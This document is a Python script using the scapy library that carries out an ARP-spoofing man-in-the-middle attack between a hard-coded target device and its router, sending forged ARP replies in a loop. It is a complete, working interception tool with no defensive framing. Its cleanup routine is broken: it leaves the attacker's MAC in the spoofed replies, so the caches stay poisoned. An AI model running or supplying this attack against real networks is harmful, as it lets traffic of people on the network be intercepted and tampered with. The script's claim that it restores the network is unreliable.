from scapy.all import ARP, Ether, sendp, sniff, get_if_hwaddr, conf
import time

# Network interface
interface = "en0"

# IPs to spoof
target_ip = "192.168.0.10"  # Target device
gateway_ip = "192.168.0.1"  # Router

# MAC addresses from your arp -a
target_mac = "82:23:bd:30:c5:46"  # For 192.168.0.10
gateway_mac = "30:67:a1:a1:28:9f"  # For 192.168.0.1

# Get your MAC
conf.iface = interface
your_mac = get_if_hwaddr(interface)  # More reliable than Ether().src
print(f"Your MAC: {your_mac}")

def spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(src=your_mac, dst=target_mac) / ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    sendp(packet, iface=interface, verbose=False)
    print(f"Sent ARP: {spoof_ip} is at {your_mac} to {target_ip}")

def restore(target_ip, source_ip, target_mac):
    packet = Ether(src=your_mac, dst=target_mac) / ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac)
    sendp(packet, iface=interface, verbose=False)
    print(f"Restored ARP for {target_ip}")

try:
    print(f"Starting MITM: Spoofing {target_ip} and {gateway_ip}")
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        time.sleep(2)

except KeyboardInterrupt:
    print("\nStopping MITM, restoring ARP tables...")
    restore(target_ip, gateway_ip, target_mac)
    restore(gateway_ip, target_ip, gateway_mac)